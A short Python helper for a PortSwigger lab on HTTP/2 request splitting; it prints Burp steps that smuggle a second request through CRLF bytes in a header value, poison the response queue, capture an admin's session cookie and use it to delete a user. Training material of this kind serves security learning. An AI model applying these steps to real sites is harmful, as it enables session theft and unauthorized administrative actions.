#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
HTTP/2 request splitting via CRLF injection.

Documentation-first — scripting this requires low-level HPACK framing to
embed real CRLF bytes inside an HTTP/2 header value. Manual Burp Inspector
+ Shift+Enter is the clean path.

Manual steps:

  1. Burp Repeater, Inspector → HTTP/2, Update Content-Length off.
  2. Change path to /x.
  3. Inspector → Request Attributes → add header:
       Name:  foo
       Value: bar<Shift+Enter><Shift+Enter>GET /x HTTP/1.1<Shift+Enter>Host: LAB-ID...
       (value visibly spans 4 lines; second line is empty)
  4. Send once (gets 404). Queue poisoned.
  5. Wait ~5s. Send `GET /` repeatedly:
       - 404 → extra queued response, resend
       - 200 → re-poison from step 4
       - 302 Set-Cookie: session=... → copy admin cookie
  6. GET /admin/delete?username=carlos with the stolen cookie.
"""

import argparse
import re


MANUAL_INSTRUCTIONS = """
Burp Repeater (Inspector → HTTP/2, Update Content-Length off):

Step 1: Change path to /x.

Step 2: Inspector → Request Attributes → add header:
    Name:  foo
    Value: bar<Shift+Enter><Shift+Enter>GET /x HTTP/1.1<Shift+Enter>Host: {host}

    Value should visibly span 4 lines:
        bar
        <blank>
        GET /x HTTP/1.1
        Host: {host}

Step 3: Send once. Response = 404. Queue is now poisoned.

Step 4: Wait ~5s. Send `GET / HTTP/2` repeatedly. Watch responses:
    - 404 → extra queued response, resend
    - 200 → off-by-one consumed, re-poison from Step 3
    - 302 Set-Cookie: session=... → ADMIN LOGIN CAPTURED, copy cookie

Step 5: Use stolen session:
----------------------------------------
GET /admin/delete?username=carlos HTTP/2
Host: {host}
Cookie: session=STOLEN-SESSION
----------------------------------------

Lab solves when carlos is deleted.

If connection stalls (10 requests): send normal GETs to reset, then re-poison.
"""


def main():
    parser = argparse.ArgumentParser(
        description="Lab 16: HTTP/2 request splitting via CRLF injection"
    )
    parser.add_argument("lab_url", help="Lab URL")
    args = parser.parse_args()

    host = re.sub(r"^https?://", "", args.lab_url.rstrip("/"))
    print(MANUAL_INSTRUCTIONS.format(host=host))


if __name__ == "__main__":
    main()
